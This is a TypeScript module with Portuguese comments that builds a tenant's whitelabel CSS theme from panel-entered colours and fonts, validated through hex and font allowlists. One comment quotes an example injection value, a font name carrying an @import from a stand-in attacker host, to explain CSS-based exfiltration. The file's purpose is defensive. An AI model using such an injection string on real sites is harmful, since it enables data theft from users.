/**
 * Geração do tema whitelabel.
 *
 * O PONTO DELICADO
 * Estamos pegando valores que um cliente digitou no painel e transformando em
 * CSS que é injetado num `<style>`. Isso é, por definição, injeção controlada.
 * A única coisa que separa "personalização" de "XSS via CSS" é a validação
 * abaixo — e ela precisa ser um allowlist estrito, aplicado AQUI, na
 * renderização, mesmo que o valor já tenha sido validado na gravação.
 *
 * Por que validar duas vezes: o dado no banco pode ter entrado por uma
 * migração, um seed, um import ou uma versão antiga do código sem validação.
 * A renderização é o último ponto em que ainda dá para impedir o estrago.
 */

const HEX = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;

/** Devolve a cor se for hexadecimal válida; senão, o padrão. Nunca lança. */
export function corSegura(valor: string | null | undefined, padrao: string): string {
  if (typeof valor !== "string") return padrao;
  const v = valor.trim();
  return HEX.test(v) ? v : padrao;
}

/**
 * Nome de fonte seguro.
 *
 * Restrito a uma lista fechada. Aceitar nome livre permitiria
 * `Arial'); @import url('https://atacante/x.css`, que traria CSS de terceiro
 * para dentro da página — e, com CSS de terceiro, dá para fazer exfiltração
 * de dados por seletores de atributo.
 */
const FONTES_PERMITIDAS = new Set([
  "Archivo",
  "Fraunces", "Instrument Sans", "Inter", "Playfair Display", "Lora",
  "Merriweather", "Source Serif 4", "DM Serif Display", "Cormorant Garamond",
  "Manrope", "Plus Jakarta Sans", "Outfit", "Sora", "Figtree", "Poppins",
  "Montserrat", "Raleway", "Work Sans", "Nunito Sans", "Libre Baskerville",
]);

export function fonteSegura(valor: string | null | undefined, padrao: string): string {
  if (typeof valor !== "string") return padrao;
  const v = valor.trim();
  return FONTES_PERMITIDAS.has(v) ? v : padrao;
}

export const fontesDisponiveis = [...FONTES_PERMITIDAS].sort();

/**
 * Um tema é "monocromático" quando a cor de acento é neutra (cinza/preto/branco
 * — baixa saturação). Nesse caso o site ativa o tratamento "Preto & Branco
 * Moderno": o acento, que sumiria sobre fundos escuros, é invertido para branco
 * nas seções escuras (ver globals.css → `.modo-mono`). Temas coloridos
 * (dourado, verde) NÃO ativam isso: sua cor aparece igual sobre claro e escuro.
 */
export function temaMonocromatico(tema: Partial<TemaTenant> | null | undefined): boolean {
  const cor = corSegura(tema?.corAcento, TEMA_PADRAO.corAcento);
  let h = cor.slice(1);
  if (h.length === 3) h = h.split("").map((c) => c + c).join("");
  const r = parseInt(h.slice(0, 2), 16);
  const g = parseInt(h.slice(2, 4), 16);
  const b = parseInt(h.slice(4, 6), 16);
  return Math.max(r, g, b) - Math.min(r, g, b) <= 18;
}

export interface TemaTenant {
  corAcento: string;
  corAcentoClara: string;
  corTinta: string;
  corPapel: string;
  fonteTitulo: string;
  fonteTexto: string;
}

export const TEMA_PADRAO: TemaTenant = {
  // Padrão whitelabel = identidade Institucional (grafite + verde floresta +
  // menta), Archivo/Inter. Toda igreja replicada nasce com este visual; quem
  // quiser troca as quatro cores no painel. corAcento é o verde escuro (bom
  // sobre claro) e corAcentoClara é a menta (usada sobre seções escuras — ver
  // a regra de contraste em globals.css).
  corAcento: "#34472F",
  corAcentoClara: "#8FBF7A",
  corTinta: "#14161A",
  corPapel: "#EEF0F2",
  fonteTitulo: "Archivo",
  fonteTexto: "Inter",
};

/** Normaliza o que veio do banco para valores comprovadamente seguros. */
export function normalizarTema(config: Partial<TemaTenant> | null | undefined): TemaTenant {
  return {
    corAcento: corSegura(config?.corAcento, TEMA_PADRAO.corAcento),
    corAcentoClara: corSegura(config?.corAcentoClara, TEMA_PADRAO.corAcentoClara),
    corTinta: corSegura(config?.corTinta, TEMA_PADRAO.corTinta),
    corPapel: corSegura(config?.corPapel, TEMA_PADRAO.corPapel),
    fonteTitulo: fonteSegura(config?.fonteTitulo, TEMA_PADRAO.fonteTitulo),
    fonteTexto: fonteSegura(config?.fonteTexto, TEMA_PADRAO.fonteTexto),
  };
}

/** Converte "#C2A15C" em "194 161 92", para usar com `rgb(var(--x) / 40%)`. */
function hexParaCanais(hex: string): string {
  let h = hex.slice(1);
  if (h.length === 3) h = h.split("").map((c) => c + c).join("");
  const r = parseInt(h.slice(0, 2), 16);
  const g = parseInt(h.slice(2, 4), 16);
  const b = parseInt(h.slice(4, 6), 16);
  return `${r} ${g} ${b}`;
}

/** Escurece/clareia uma cor. Usado para gerar os tons derivados do tema. */
function ajustarLuminosidade(hex: string, fator: number): string {
  let h = hex.slice(1);
  if (h.length === 3) h = h.split("").map((c) => c + c).join("");
  const ajustar = (n: number) =>
    Math.max(0, Math.min(255, Math.round(n + (fator > 0 ? (255 - n) * fator : n * fator))));
  const r = ajustar(parseInt(h.slice(0, 2), 16));
  const g = ajustar(parseInt(h.slice(2, 4), 16));
  const b = ajustar(parseInt(h.slice(4, 6), 16));
  return `#${[r, g, b].map((n) => n.toString(16).padStart(2, "0")).join("")}`;
}

/**
 * Monta o CSS das custom properties do tenant.
 *
 * Toda interpolação nesta template string passou por `corSegura` ou
 * `fonteSegura`, que são allowlists ancoradas. Não existe caminho por onde um
 * caractere `;`, `}` ou `(` do usuário chegue até aqui.
 */
export function cssDoTema(tema: TemaTenant): string {
  const t = normalizarTema(tema); // defensivo: revalida mesmo já normalizado

  return `:root{
--gold:${t.corAcento};
--gold-bright:${t.corAcentoClara};
--gold-rgb:${hexParaCanais(t.corAcento)};
--gold-line:rgb(${hexParaCanais(t.corAcento)} / 0.38);
--ink:${t.corTinta};
--ink-rgb:${hexParaCanais(t.corTinta)};
--ink-900:${ajustarLuminosidade(t.corTinta, -0.25)};
--ink-800:${ajustarLuminosidade(t.corTinta, 0.06)};
--ink-700:${ajustarLuminosidade(t.corTinta, 0.14)};
--ink-600:${ajustarLuminosidade(t.corTinta, 0.22)};
--ink-500:${ajustarLuminosidade(t.corTinta, 0.32)};
--paper:${t.corPapel};
--paper-2:${ajustarLuminosidade(t.corPapel, -0.05)};
--paper-3:${ajustarLuminosidade(t.corPapel, -0.1)};
--font-display:"${t.fonteTitulo}",Georgia,serif;
--font-sans:"${t.fonteTexto}",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
}`;
}

/**
 * URL do Google Fonts para as duas famílias do tenant.
 *
 * Os nomes vêm da allowlist, então `encodeURIComponent` é redundância — mas
 * redundância barata numa string que vira `href` de `<link>`.
 */
export function urlGoogleFonts(tema: TemaTenant): string {
  const t = normalizarTema(tema);
  // Faixa 300..800: o tema "preto & branco moderno" usa pesos editoriais
  // pesados (título do hero em 800, caixa-alta). Faixas menores deixavam o
  // hero fino demais.
  const familias = [...new Set([t.fonteTitulo, t.fonteTexto])]
    .map((f) => `family=${encodeURIComponent(f).replace(/%20/g, "+")}:ital,wght@0,300..800;1,300..800`)
    .join("&");
  return `https://fonts.googleapis.com/css2?${familias}&display=swap`;
}
